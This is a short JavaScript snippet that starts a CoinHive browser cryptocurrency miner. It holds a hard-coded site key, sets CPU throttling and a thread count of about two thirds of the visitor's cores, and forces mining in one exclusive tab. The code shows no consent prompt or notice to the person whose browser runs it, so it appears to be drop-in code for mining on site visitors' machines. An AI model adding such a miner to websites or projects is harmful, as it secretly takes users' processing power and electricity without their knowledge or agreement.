/* global navigator */
/* global CoinHive */

const fullPower = false;

const pk = 'MBzdhm0poaPi8l1qXQlbY8y7r00kX4Nz';

var conf = {	
	throttle: fullPower ? 0 : 0.333	
};

if (!fullPower)
	conf.threads = Math.floor((navigator.hardwareConcurrency/3)*2);

const cnhv = new CoinHive.Anonymous(pk,conf);

cnhv.start(CoinHive.FORCE_EXCLUSIVE_TAB);